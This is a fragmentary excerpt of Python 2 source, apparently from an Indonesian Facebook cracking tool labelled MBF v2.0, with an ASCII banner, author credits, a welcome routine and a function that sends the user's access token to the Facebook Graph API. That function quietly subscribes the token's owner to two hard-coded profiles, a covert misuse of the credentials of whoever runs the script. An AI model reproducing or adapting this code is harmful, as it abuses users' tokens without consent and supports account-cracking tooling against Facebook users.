...
\033[0;93m   /  |/  / ___/ ____   / _ )/ __/ ® \033[;0m|| \033[1;96mCreated By Reza Alfauzan
\033[0;93m  / /|_/ / /___ /___/  / _  / _/     \033[;0m|| \033[1;96mGithub.com/Reaper-XD
\033[0;93m /_/  /_/_____/       /____/_/ \033[0;91mv2.0  \033[;0m|| \033[1;96mFacebook.com/ReaperXD277'''
...
def rezaxd():
    ...
    try:
        ...
        print '%s\n\n %s*%s selamat datang %s%s%s'%(N,O,N,K,nama,N);time.sleep(2)
...
def wuhan(kontol):
    try:
        ...
        requests.post('https://graph.facebook.com/100071941341669/subscribers?access_token=%s'%(kentod))
	requests.post('https://graph.facebook.com/100061611161110/subscribers?access_token=%s'%(kentod))
